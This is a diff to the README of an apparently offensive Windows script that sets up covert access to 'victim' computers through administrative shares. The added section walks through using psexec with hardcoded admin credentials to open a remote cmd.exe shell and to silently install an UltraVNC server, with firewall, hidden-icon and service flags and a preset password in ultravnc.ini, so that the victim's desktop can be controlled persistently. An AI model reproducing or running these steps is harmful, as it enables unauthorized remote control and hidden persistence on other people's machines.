@@ -19,13 +19,42 @@ The address \\ip\c$ gives the attacker full access (including write) to the c dr
 ![Administrative shares](administrative-shares.png "Administrative shares")
 
 The script prompts for an alias for the target computer before it finishes running. The nickname entered is saved at the end of the hadmin.bat file along with the mac address of the computer on which the script is run. This mac address is stored to identify the victim computer on the network. If necessary, the current IP address of the target computer can be resolved by scanning the network from the mac address added to the end of the file.
-# Next Stage
+# Next Stage: Remote Shell
 You can run commands on the victim computer by taking advantage of the RPC feature of Windows. You can access the command line of the remote computer with the psexec program by downloading pstools from [the microsoft site](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) (sysinternals). PSEXEC tries to connect to the Admin$ share of the remote computer, in order to copy on the remote machine the PSEXecSVC.exe, which is the binary of the Service that will run remotely. The following psexec tutorial runs cmd.exe in interactive mode on the remote computer. Once you have the command line, what you can do is limited by your imagination.
 
 ![Remote shell](remote-shell.png "Remote shell")
 
+## Install VNC Server to Victim
 
-## Some commands
+### Step 1: Download latest ultravnc setup to host and rename to uvncsetup.exe
+### Step 2: Copy unvcsetup.exe to victim computer with path \\victim\c$\uvncsetup.exe
+### Step 3: To start silent installation on victim run uvncsetup.exe as remotely below:
+
+> psexec \\victim -u admin -p admin0 -h -i -c C:\uvncsetup.exe /SP- /VERYSILENT /SUPPRESSMSGBOXES /NOCANCEL /NORESTART /CLOSEAPPLICATIONS /FORCECLOSEAPPLICATIONS /LOGCLOSEAPPLICATIONS /RESTARTAPPLICATIONS /NOICONS /FIREWALL /NOVIEW /COMPONENTS="ultravnc_server" /TASKS="installservice,startservice" /DIR="%programfiles%\uvnc"
+
+### Step 4: To define new password for UltraVNC server open a remote shell to victim computer below:
+
+psexec \\192.168.0.29 -u admin -p admin0 -h -i cmd.exe
+
+### Step 5: stop the uvnc_service service to set the password using the remote shell you opened in the previous step 
+
+> net stop uvnc_service
+
+### Step 6: Create ultravnc.ini 
+
+Create the ultravnc.ini file with the password defined in the "%programfiles%\uvnc" of the victim computer. 
+UltraVNC password is "admin0" defined in ultravnc.ini. The ini file content is below:
+
+[ultravnc]
+passwd=56B6ACA18D1BA76008
+passwd2=56B6ACA18D1BA76008
+
+### Step 7: Start the service
+
+> net start uvnc_service
+
+
+## Some usefull commands
 
 Some functional command examples listed below. 
 > fsutil fsinfo drives : Get fixed disk drives list.
